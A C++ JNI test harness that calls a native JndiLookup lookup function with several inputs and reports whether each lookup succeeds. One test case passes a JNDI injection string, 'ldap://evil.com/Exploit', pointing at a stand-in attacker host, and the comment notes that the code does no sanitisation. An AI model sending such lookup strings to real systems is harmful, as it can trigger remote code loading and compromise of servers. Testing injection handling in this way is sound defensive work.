#include <jni.h>
#include <string.h>
#include <iostream>

// Original function declaration (assumed unchanged)
extern "C" JNIEXPORT jobject JNICALL Java_JndiLookup_lookup(JNIEnv *env, jclass clazz, jstring name);

// Helper to create jstring and call lookup, handle nullptr results
bool test_lookup(JNIEnv* env, const char* input, bool expect_success) {
    jstring jname = env->NewStringUTF(input);
    jobject result = Java_JndiLookup_lookup(env, nullptr, jname);
    env->DeleteLocalRef(jname);

    if (result != nullptr) {
        if (expect_success) {
            std::cout << "Test Passed: Lookup succeeded for input: \"" << input << "\"\n";
            return true;
        } else {
            std::cout << "Test Failed: Lookup succeeded but was expected to fail for input: \"" << input << "\"\n";
            return false;
        }
    } else {
        if (!expect_success) {
            std::cout << "Test Passed: Lookup failed as expected for input: \"" << input << "\"\n";
            return true;
        } else {
            std::cout << "Test Failed: Lookup failed unexpectedly for input: \"" << input << "\"\n";
            return false;
        }
    }
}

int main() {
    JavaVM *jvm;
    JNIEnv *env;
    JavaVMInitArgs vm_args;
    memset(&vm_args, 0, sizeof(vm_args));
    vm_args.version = JNI_VERSION_1_8; // Adjust as needed
    vm_args.nOptions = 0;

    jint res = JNI_CreateJavaVM(&jvm, (void**)&env, &vm_args);
    if (res != JNI_OK) {
        std::cerr << "Failed to create JVM\n";
        return 1;
    }

    // Test cases

    // 1. Normal safe input - expect success
    test_lookup(env, "java:comp/env/jdbc/MyDataSource", true);

    // 2. Potentially malicious input (attempt JNDI injection) - currently no sanitization, expect success but SHOULD fail in real secure code
    test_lookup(env, "ldap://evil.com/Exploit", true); // fail not implemented

    // 3. Empty string input - expect failure or success depending on Java impl, assume failure
    test_lookup(env, "", false);

    // 4. Null input - can't create jstring, skip or test not applicable

    // 5. Input with special characters - expect success or failure depending on Java, assume success
    test_lookup(env, "java:comp/env/ldap/ValidName", true);

    // Destroy JVM (commented out as per your original comment)
    // env->DestroyJavaVM();

    return 0;
}
